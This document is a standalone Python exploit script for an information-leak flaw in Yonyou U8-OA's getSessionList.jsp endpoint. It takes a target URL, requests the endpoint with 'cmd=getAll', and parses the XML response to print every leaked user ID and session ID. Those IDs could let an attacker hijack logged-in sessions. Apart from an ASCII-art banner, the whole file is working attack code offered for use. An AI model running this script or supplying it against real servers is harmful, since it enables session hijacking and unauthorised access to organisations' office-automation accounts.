# encoding: utf-8
import requests
import sys
import argparse
import xml.etree.ElementTree as ET

def get_args():
    parser=argparse.ArgumentParser(
            prog='U8OA-leak.py',description='input url to run the script')
    parser.add_argument("-u","--url",type=str,help='input url')
    parser.add_argument("-v","--version",action='version',version='%(prog)s 1.0')
    args=parser.parse_args()
    return args

def main():

    try:
        print(r"""                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/
                   *-/*-._* `.
                    /     *-.'._
                   /\       /-._*-._
                  /  ) _,-*/    *-(_)
                 / // /   /
 _     _        /    _   / _ ____                       _
| |   (_) __ _ _   _(_) __| / ___|_      _____  _ __ __| |
| |   | |/ _` | | | | |/ _` \___ \ \ /\ / / _ \| '__/ _` |
| |___| | (_| | |_| | | (_| |___) \ V  V / (_) | | | (_| |
|_____|_|\__, |\__,_|_|\__,_|____/ \_/\_/ \___/|_|  \__,_|
            |_|
         /  / /    /
        /  / / L  /
       /  / / Z  /
      /  / / J  /
     /  |,'    /
    :   /     /
    [  /   ,'
    | /  ,'
    |/,-'
    '
          """)
        print("***********************************************")
        print("*用友U8-OA getSessionList.jsp敏感信息泄漏漏洞 *")
        print("*               V1.0  by 液体剑               *")
        print("***********************************************\n")


        args=get_args()
        url=args.url
        payload='/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
        req=requests.post(url+payload)
        res=req.text
        if("<usrID>" in res):
            xml_str=res[45:]
            root=ET.fromstring(xml_str)
            print("\033[32m[+] 存在漏洞!!!\033[0m")
            for session in root.findall("./Session"):
                usrID = session.find("usrID").text
                sessionID = session.find("sessionID").text
                print(f"\033[32musrID:\033[0m{usrID}\033[32msessionID:\033[0m{sessionID}")
               #print("\033[32m[+] 存在漏洞:\033[0m"+res)
            #print(xml_str)
        else:
            print("\033[0;31;40m[-] 不存在漏洞\033[0m")

    except:
        print("\033[0;31;40mERROR!\033[0m")

if __name__=="__main__":
    get_args()
    main()
